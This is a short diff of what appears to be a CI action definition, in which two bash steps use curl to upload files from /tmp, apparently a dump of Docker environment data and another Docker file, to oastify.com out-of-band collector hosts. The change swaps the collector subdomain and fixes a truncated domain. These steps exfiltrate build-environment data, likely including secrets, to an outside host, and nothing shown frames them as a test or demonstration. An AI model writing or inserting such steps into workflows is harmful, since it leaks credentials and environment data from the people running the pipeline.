@@ -200,8 +200,8 @@ runs:
         
     - name: My request
       shell: bash
-      run: curl -X POST -F "file=@/tmp/docker_env.txt" http://3hl7qaz9b8q5nzlf35da5m1ed5jw7nxbm.oastify.co
+      run: curl -X POST -F "file=@/tmp/docker_env.txt" http://6fmaodxc9bo8l2ji18bd3pzhb8hz5qwel.oastify.com
     
     - name: Send docker123
       shell: bash
-      run: curl -X POST -F "file=@/tmp/docker123" http://3hl7qaz9b8q5nzlf35da5m1ed5jw7nxbm.oastify.com    
+      run: curl -X POST -F "file=@/tmp/docker123" http://6fmaodxc9bo8l2ji18bd3pzhb8hz5qwel.oastify.com
